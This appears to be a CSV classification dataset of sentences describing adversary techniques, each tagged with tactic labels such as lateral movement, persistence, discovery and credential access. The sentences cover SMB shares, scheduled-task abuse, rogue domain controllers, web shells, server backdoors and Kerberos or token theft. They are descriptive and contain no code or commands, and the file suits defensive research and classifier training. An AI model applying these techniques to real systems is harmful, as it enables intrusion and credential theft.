"SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain.",LATERAL_MOVEMENT,,,
"Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network.",LATERAL_MOVEMENT,,,
Linux and macOS implementations of SMB typically use Samba.,LATERAL_MOVEMENT,,,
Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions.,LATERAL_MOVEMENT,,,
"Example network shares include `C$`, `ADMIN$`, and `IPC$`.",LATERAL_MOVEMENT,,,
"Adversaries may use this technique in conjunction with administrator-level [Valid Accounts] to remotely access a networked system over SMB,.",LATERAL_MOVEMENT,,,
Adversaries may use [Valid Accounts] to log into remote machines using Secure Shell (SSH).,LATERAL_MOVEMENT,,,
SSH is a protocol that allows authorized users to open remote shells on other computers.,LATERAL_MOVEMENT,,,
"Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it.",LATERAL_MOVEMENT,,,
The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password.,LATERAL_MOVEMENT,,,
"In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.",LATERAL_MOVEMENT,,,
Adversaries may use [Valid Accounts] to remotely control machines using Virtual Network Computing (VNC).,LATERAL_MOVEMENT,,,
"VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.",LATERAL_MOVEMENT,,,
VNC differs from [Remote Desktop Protocol] as VNC is screen-sharing software rather than resource-sharing software.,LATERAL_MOVEMENT,,,
"By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.",LATERAL_MOVEMENT,,,
"Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands.",LATERAL_MOVEMENT,,,
An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network.,LATERAL_MOVEMENT,,,
Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.,LATERAL_MOVEMENT,,,
Adversaries may use [Valid Accounts] to interact with remote systems using Windows Remote Management (WinRM).,LATERAL_MOVEMENT,,,
"WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).",LATERAL_MOVEMENT,,,
"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system.",DISCOVERY,,,
"Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as [Ping] or net view using [Net].",DISCOVERY,,,
Adversaries may also analyze data from local host files (ex: C:\Windows\System32\Drivers\etc\hosts or /etc/hosts) or other passive means (such as local [Arp] cache entries) in order to discover the presence of remote systems in an environment.,DISCOVERY,,,
Adversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI] commands on network devices to gather detailed information about systems within a network.,DISCOVERY,,,
"In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system.",INITIAL_ACCESS,LATERAL_MOVEMENT,,
"In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.",INITIAL_ACCESS,LATERAL_MOVEMENT,,
"Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems, which may impact system and/or hosted service availability.",IMPACT,,,
One common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency.,IMPACT,,,
Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.,IMPACT,,,
"Additionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources.",IMPACT,,,
Adversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service] campaigns and/or to seed malicious torrents.,IMPACT,,,
Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data.,DEFENSE_EVASION,,,
DCShadow may be used to create a rogue Domain Controller (DC).,DEFENSE_EVASION,,,
"DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC.",DEFENSE_EVASION,,,
"Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.",DEFENSE_EVASION,,,
"Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash.",DEFENSE_EVASION,,,
This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors).,DEFENSE_EVASION,,,
Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information.,DEFENSE_EVASION,,,
"Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware].",DEFENSE_EVASION,,,
Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.,EXECUTION,PERSISTENCE,,
Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time.,EXECUTION,PERSISTENCE,,
"A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments).",EXECUTION,PERSISTENCE,,
Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.,EXECUTION,PERSISTENCE,,
Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence.,EXECUTION,PERSISTENCE,,
These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).,EXECUTION,PERSISTENCE,,

Adversaries may abuse the [at] utility to perform task scheduling for initial or recurring execution of malicious code.,EXECUTION,PERSISTENCE,,
"The [at] utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date.",EXECUTION,PERSISTENCE,,
"Although deprecated in favor of [Scheduled Task]'s [schtasks] in Windows environments, using [at] requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.",EXECUTION,PERSISTENCE,,
"On Linux and macOS, [at] may be invoked by the superuser as well as any users added to the at.allow file.",EXECUTION,PERSISTENCE,,
"If the at.allow file does not exist, the at.deny file is checked.",EXECUTION,PERSISTENCE,,
Every username not listed in at.deny is allowed to invoke [at].,EXECUTION,PERSISTENCE,,
"If the at.deny exists and is empty, global use of [at] is permitted.",EXECUTION,PERSISTENCE,,
If neither file exists (which is often the baseline) only the superuser is allowed to use [at].,EXECUTION,PERSISTENCE,,
Adversaries may use [at] to execute programs at system startup or on a scheduled basis for [Persistence]. [at] can also be abused to conduct remote [Execution] as part of [Lateral Movement] and/or to run a process under the context of a specified account (such as SYSTEM).,EXECUTION,PERSISTENCE,,
"In Linux environments, adversaries may also abuse [at] to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands.",EXECUTION,PERSISTENCE,,
"Similarly, [at] may also be used for [Privilege Escalation] if the binary is allowed to run as superuser via sudo.",EXECUTION,PERSISTENCE,,
Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code.,EXECUTION,PERSISTENCE,,
"Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system.",EXECUTION,PERSISTENCE,,
"Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.",EXECUTION,PERSISTENCE,,
"In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.",EXECUTION,PERSISTENCE,,
Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code.,EXECUTION,PERSISTENCE,,
The cron utility is a time-based job scheduler for Unix-like operating systems.,EXECUTION,PERSISTENCE,,
The crontab file contains the schedule of cron entries to be run and the specified times for execution.,EXECUTION,PERSISTENCE,,
Any crontab files are stored in operating system-specific file paths.,EXECUTION,PERSISTENCE,,
An adversary may use cron in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence].,EXECUTION,PERSISTENCE,,
Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code.,EXECUTION,PERSISTENCE,,
There are multiple ways to access the Task Scheduler in Windows.,EXECUTION,PERSISTENCE,,
"The [schtasks] utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.",EXECUTION,PERSISTENCE,,
"In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.",EXECUTION,PERSISTENCE,,
"The deprecated [at] utility could also be abused by adversaries (ex: [At]), though at.exe can not access tasks created with schtasks or the Control Panel.",EXECUTION,PERSISTENCE,,
An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence.,EXECUTION,PERSISTENCE,,
The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM).,EXECUTION,PERSISTENCE,,
"Similar to [System Binary Proxy Execution], adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.",EXECUTION,PERSISTENCE,,
Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code.,EXECUTION,PERSISTENCE,,
Systemd timers are unit files with file extension .timer that control services.,EXECUTION,PERSISTENCE,,
Timers can be set to run on a calendar event or after a time span relative to a starting point.,EXECUTION,PERSISTENCE,,
They can be used as an alternative to [Cron] in Linux environments.,EXECUTION,PERSISTENCE,,
"Each .timer file must have a corresponding .service file with the same name, e.g., example.timer and example.service. .service files are [Systemd Service] unit files that are managed by the systemd system and service manager.",EXECUTION,PERSISTENCE,,
Privileged timers are written to /etc/systemd/system/ and /usr/lib/systemd/system while user level are written to ~/.config/systemd/user/.,EXECUTION,PERSISTENCE,,
An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.,EXECUTION,PERSISTENCE,,
Timers installed using privileged paths may be used to maintain root level persistence.,EXECUTION,PERSISTENCE,,
Adversaries may also install user level timers to achieve user level persistence.,EXECUTION,PERSISTENCE,,
Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals.,EXFILTRATION,,,
This could be done to blend traffic patterns with normal activity or availability.,EXFILTRATION,,,

"Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information] or [Search Open Technical Databases]), establishing operational resources (ex: [Establish Accounts] or [Compromise Accounts]), and/or initial access (ex: [Valid Accounts] or [Phishing]).",RECONNAISSANCE,,,
Adversaries may search social media for information about victims that can be used during targeting.,RECONNAISSANCE,,,
Adversaries may search in different social media sites depending on what information they seek to gather.,RECONNAISSANCE,,,
"Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e. [Spearphishing Service])..",RECONNAISSANCE,,,
Adversaries may search websites owned by the victim for information that can be used during targeting.,RECONNAISSANCE,,,
"Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: [Email Addresses]).",RECONNAISSANCE,,,
These sites may also have details highlighting business operations and relationships.,RECONNAISSANCE,,,
Adversaries may search victim-owned websites to gather actionable information.,RECONNAISSANCE,,,
"Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information] or [Search Open Technical Databases]), establishing operational resources (ex: [Establish Accounts] or [Compromise Accounts]), and/or initial access (ex: [Trusted Relationship] or [Phishing]).",RECONNAISSANCE,,,
Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems.,PERSISTENCE,,,
Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application.,PERSISTENCE,,,
Adversaries may install malicious components to extend and abuse server applications.,PERSISTENCE,,,
Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence.,PERSISTENCE,,,
IIS provides several mechanisms to extend the functionality of the web servers.,PERSISTENCE,,,
"For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests.",PERSISTENCE,,,
"Extensions and filters are deployed as DLL files that export three functions: Get{Extension/Filter}Version, Http{Extension/Filter}Proc, and (optionally) Terminate{Extension/Filter}.",PERSISTENCE,,,
IIS modules may also be installed to extend IIS web servers.,PERSISTENCE,,,
ISAPI extensions and filters may have access to all IIS web requests and responses.,PERSISTENCE,,,
"For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.",PERSISTENCE,,,
Adversaries may also install malicious IIS modules to observe and/or modify traffic.,PERSISTENCE,,,
IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters.,PERSISTENCE,,,
"IIS modules can be written as a DLL that exports RegisterModule, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.",PERSISTENCE,,,
Adversaries may abuse SQL stored procedures to establish persistent access to systems.,PERSISTENCE,,,
SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries.,PERSISTENCE,,,
Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).,PERSISTENCE,,,
Microsoft SQL Server can enable common language runtime (CLR) integration.,PERSISTENCE,,,
"With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g.",PERSISTENCE,,,
"VB .NET, C#, etc.).",PERSISTENCE,,,
Adversaries may abuse components of Terminal Services to enable persistent access to systems.,PERSISTENCE,,,
"Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts.",PERSISTENCE,,,
"Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.



[Windows Service]s that are run as a ""generic"" process (ex: svchost.exe) load the service's DLL file, the location of which is stored in a Registry entry named ServiceDll.",PERSISTENCE,,,
"The termsrv.dll file, typically stored in `%SystemRoot%\System32\`, is the default ServiceDll value for Terminal Services in `HKLM\System\CurrentControlSet\services\TermService\Parameters\`.",PERSISTENCE,,,
Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.,PERSISTENCE,,,
On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.,PERSISTENCE,,,
Adversaries may abuse Microsoft transport agents to establish persistent access to systems.,PERSISTENCE,,,
"Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.",PERSISTENCE,,,
Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server.,PERSISTENCE,,,
Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks.,PERSISTENCE,,,
Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.,PERSISTENCE,,,
"Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria.",PERSISTENCE,,,
"For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.",PERSISTENCE,,,
Adversaries may backdoor web servers with web shells to establish persistent access to systems.,PERSISTENCE,,,
A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network.,PERSISTENCE,,,
A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.,PERSISTENCE,,,
"In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: [China Chopper] Web shell client).",PERSISTENCE,,,
Adversaries may stop or disable services on a system to render those services unavailable to legitimate users.,IMPACT,,,
Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.,IMPACT,,,
"Adversaries may accomplish this by disabling individual services of high importance to an organization, such as MSExchangeIS, which will make Exchange content inaccessible.",IMPACT,,,
The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths.,EXECUTION,,,
"This functionality resides in NTDLL.dll and is part of the Windows [Native API] which is called from functions like CreateProcess, LoadLibrary, etc. of the Win32 API.",EXECUTION,,,
"The module loader can load DLLs:
* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;
* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);
* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;
* via &#x3c;file name=""filename.extension"" loadFrom=""fully-qualified or relative pathname""&#x3e; in an embedded or external ""application manifest"".",EXECUTION,,,
The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.,EXECUTION,,,
Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system.,EXECUTION,,,
"For example, malware may execute share modules to load additional components or features.",EXECUTION,,,
"Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network.",EXECUTION,LATERAL_MOVEMENT,,
Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system.,EXECUTION,LATERAL_MOVEMENT,,
"The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required.",EXECUTION,LATERAL_MOVEMENT,,
"However, the system may require an administrative account to log in or to perform it's intended purpose.",EXECUTION,LATERAL_MOVEMENT,,
Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment.,DISCOVERY,,,
"Adversaries may use the information from [Software Discovery] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",DISCOVERY,,,
"Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation].",DISCOVERY,,,
"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment.",DISCOVERY,,,
This may include things such as firewall rules and anti-virus.,DISCOVERY,,,
"Adversaries may use the information from [Security Software Discovery] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",DISCOVERY,,,
"Example commands that can be used to obtain security software information are [netsh], reg query with [Reg], dir with [cmd], and [Tasklist], but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.",DISCOVERY,,,
It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.,DISCOVERY,,,
Adversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.,DISCOVERY,,,
"Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting.",RESOURCE_DEVELOPMENT,,,
"To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities]) or obtained ([Obtain Capabilities]) and stage them on infrastructure under their control.",RESOURCE_DEVELOPMENT,,,
These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure]) or was otherwise compromised by them ([Compromise Infrastructure]).,RESOURCE_DEVELOPMENT,,,
"Capabilities can also be staged on web services, such as GitHub or Pastebin.",RESOURCE_DEVELOPMENT,,,
"Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):



* Staging web resources necessary to conduct [Drive-by Compromise] when a user browses to a site.

* Staging web resources for a link target to be used with spearphishing.

* Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer].

* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography] with [Web Protocols]).",RESOURCE_DEVELOPMENT,,,
Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing.,RESOURCE_DEVELOPMENT,,,
"Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise].",RESOURCE_DEVELOPMENT,,,
"In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token].",RESOURCE_DEVELOPMENT,,,
"Prior to [Drive-by Compromise], adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site.",RESOURCE_DEVELOPMENT,,,
Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure]) or previously compromised ([Compromise Infrastructure]).,RESOURCE_DEVELOPMENT,,,
"Adversaries may upload or inject malicious web content, such as [JavaScript], into websites.",RESOURCE_DEVELOPMENT,,,
"Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest.",RESOURCE_DEVELOPMENT,,,
This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.,RESOURCE_DEVELOPMENT,,,
"Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains]) to help facilitate [Drive-by Compromise].",RESOURCE_DEVELOPMENT,,,
Adversaries may install SSL/TLS certificates that can be used during targeting.,RESOURCE_DEVELOPMENT,,,
SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems.,RESOURCE_DEVELOPMENT,,,
"Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct.",RESOURCE_DEVELOPMENT,,,
"If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner.",RESOURCE_DEVELOPMENT,,,
"Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.",RESOURCE_DEVELOPMENT,,,
"Adversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography] with [Web Protocols]) or lending credibility to a credential harvesting site.",RESOURCE_DEVELOPMENT,,,
"Installation of digital certificates may take place for a number of server types, including web servers and email servers.",RESOURCE_DEVELOPMENT,,,
Adversaries can obtain digital certificates (see [Digital Certificates]) or create self-signed certificates (see [Digital Certificates]).,RESOURCE_DEVELOPMENT,,,
Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure]) or previously compromised ([Compromise Infrastructure]).,RESOURCE_DEVELOPMENT,,,
Adversaries may put in place resources that are referenced by a link that can be used during targeting.,RESOURCE_DEVELOPMENT,,,
"An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in [Malicious Link].",RESOURCE_DEVELOPMENT,,,
"Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.",RESOURCE_DEVELOPMENT,,,
"Prior to a phish for information (as in [Spearphishing Link]) or a phish to gain initial access to a system (as in [Spearphishing Link]), an adversary must set up the resources for a link target for the spearphishing link.",RESOURCE_DEVELOPMENT,,,
"Typically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript] to decide what content to serve to the user.",RESOURCE_DEVELOPMENT,,,
"Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link]. and have the link target point to malware for download/execution by the user.",RESOURCE_DEVELOPMENT,,,
"Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains]) to help facilitate [Malicious Link].",RESOURCE_DEVELOPMENT,,,
Link shortening services can also be employed.,RESOURCE_DEVELOPMENT,,,
Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting.,RESOURCE_DEVELOPMENT,,,
"Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content.",RESOURCE_DEVELOPMENT,,,
"Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer] by placing it on an Internet accessible web server.",RESOURCE_DEVELOPMENT,,,
Malware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure]) or was otherwise compromised by them ([Compromise Infrastructure]).,RESOURCE_DEVELOPMENT,,,
"Malware can also be staged on web services, such as GitHub or Pastebin.",RESOURCE_DEVELOPMENT,,,
"Adversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub).",RESOURCE_DEVELOPMENT,,,
"By chance encounter, victims may directly download/install these backdoored files via [User Execution]. [Masquerading] may increase the chance of users mistakenly executing these files.",RESOURCE_DEVELOPMENT,,,
Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting.,RESOURCE_DEVELOPMENT,,,
"Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec]).",RESOURCE_DEVELOPMENT,,,
"Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer] by placing it on an Internet accessible web server.",RESOURCE_DEVELOPMENT,,,
Tools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure]) or was otherwise compromised by them ([Compromise Infrastructure]).,RESOURCE_DEVELOPMENT,,,
"Tools can also be staged on web services, such as an adversary controlled GitHub repo.",RESOURCE_DEVELOPMENT,,,
"Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.",RESOURCE_DEVELOPMENT,,,
Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.,CREDENTIAL_ACCESS,,,
Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).,CREDENTIAL_ACCESS,,,
OAuth is one commonly implemented framework that issues tokens to users for access to systems.,CREDENTIAL_ACCESS,,,
"Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.",CREDENTIAL_ACCESS,,,
"In Kubernetes environments, processes running inside a container communicate with the Kubernetes API server using service account tokens.",CREDENTIAL_ACCESS,,,
"If a container is compromised, an attacker may be able to steal the container’s token and thereby gain access to Kubernetes API commands.",CREDENTIAL_ACCESS,,,
"Token theft can also occur through social engineering, in which case user action may be required to grant access.",CREDENTIAL_ACCESS,,,
An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols.,CREDENTIAL_ACCESS,,,
An example commonly-used sequence is Microsoft's Authorization Code Grant flow.,CREDENTIAL_ACCESS,,,
An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials.,CREDENTIAL_ACCESS,,,
Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.,CREDENTIAL_ACCESS,,,
"Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token.",CREDENTIAL_ACCESS,,,
"However, in some cases, adversaries can also steal application refresh tokens, allowing them to obtain new access tokens without prompting the user.",CREDENTIAL_ACCESS,,,
Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.,CREDENTIAL_ACCESS,,,
"Cookies are often valid for an extended period of time, even if the web application is not actively used.",CREDENTIAL_ACCESS,,,
"Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems.",CREDENTIAL_ACCESS,,,
"Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services).",CREDENTIAL_ACCESS,,,
Session cookies can be used to bypasses some multi-factor authentication protocols.,CREDENTIAL_ACCESS,,,
There are several examples of malware targeting cookies from web browsers on the local system.,CREDENTIAL_ACCESS,,,
"After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie] technique to login to the corresponding web application.",CREDENTIAL_ACCESS,,,
Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket].,CREDENTIAL_ACCESS,,,
Kerberos is an authentication protocol widely used in modern Windows domain environments.,CREDENTIAL_ACCESS,,,
"In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).",CREDENTIAL_ACCESS,,,
"Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated.",CREDENTIAL_ACCESS,,,
The KDC is responsible for both authentication and ticket granting.,CREDENTIAL_ACCESS,,,
Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.,CREDENTIAL_ACCESS,,,
"On Windows, the built-in klist utility can be used to list and analyze cached Kerberos tickets.",CREDENTIAL_ACCESS,,,
"Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the ""ccache"".",CREDENTIAL_ACCESS,,,
The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.,CREDENTIAL_ACCESS,,,
"Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux.",CREDENTIAL_ACCESS,,,
"By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access.",CREDENTIAL_ACCESS,,,
The storage location for these ccache entries is influenced by the /etc/krb5.conf configuration file and the KRB5CCNAME environment variable which can specify to save them to disk or keep them protected via the KCM daemon.,CREDENTIAL_ACCESS,,,
"Users can interact with ticket storage using kinit, klist, ktutil, and kcc built-in binaries or via Apple's native Kerberos framework.",CREDENTIAL_ACCESS,,,
Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.,CREDENTIAL_ACCESS,,,
Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking] Kerberos messages.,CREDENTIAL_ACCESS,,,
Preauthentication offers protection against offline [Password Cracking].,CREDENTIAL_ACCESS,,,
"When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password.",CREDENTIAL_ACCESS,,,
"If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user.",CREDENTIAL_ACCESS,,,
Part of the AS-REP message is signed with the user’s password.,CREDENTIAL_ACCESS,,,
"For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4.",CREDENTIAL_ACCESS,,,
